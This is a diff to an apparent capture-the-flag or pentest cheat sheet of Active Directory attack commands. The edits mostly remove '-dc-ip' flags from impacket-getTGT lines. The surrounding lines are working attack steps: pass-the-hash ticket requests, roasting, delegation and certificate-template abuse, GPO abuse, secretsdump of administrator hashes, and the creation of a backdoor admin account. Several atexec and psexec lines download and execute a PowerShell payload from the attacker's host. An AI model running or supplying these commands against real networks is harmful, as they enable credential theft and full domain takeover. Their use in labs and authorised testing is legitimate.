@@ -181,7 +181,7 @@ unzip backup.zip -d .
 
 ## Valid Creds
 sudo skewme $TARGET
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; kcme
+impacket-getTGT $DOM/'$USERNAME':'$PASSWORD'; kcme
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
@@ -205,11 +205,11 @@ net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 net user administrator 123qweasdF!
 
 ## GG - ROOT FLAG
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-getTGT $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
 impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'; kcme
+impacket-getTGT $DOM/'administrator':'123qweasdF!'; kcme
 impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
@@ -520,7 +520,7 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED 
 +---------- AddAllowedToAct / AllowedToAct ----------+
 Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
 export OWNED_COMPUTER='' # without $ sign
-impacket-getTGT -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
+impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
 impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
 impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
 kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
@@ -606,8 +606,8 @@ WriteOwner
 https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; kcme
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':$HASH'; kcme
+impacket-getTGT $DOM/'$USERNAME':'$PASSWORD'; kcme
+impacket-getTGT $DOM/'$USERNAME' -hashes ':$HASH'; kcme
 
 +---------- ESC1 ----------+
 adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -target $DC -key-size '4096'
@@ -664,7 +664,7 @@ Get-GPPermission -Name "Default Domain Controllers Policy" -TargetName "GPO Mana
 +---------- Execute ----------+
 python3 pygpoabuse.py -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -taskname 'Custom Task' -gpo-id '6ac1786c-016f-11d2-945f-00c04fb984f9'
 gpupdate /force
-impacket-getTGT -dc-ip $TARGET $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
+impacket-getTGT $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
 
 [*] Cracking
 +---------- Identify ----------+
@@ -881,15 +881,15 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
+impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
 
 +---------- Kerberos .ccache Negotiation ----------+
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
-impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; kcme
-impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
+impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
+impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
 
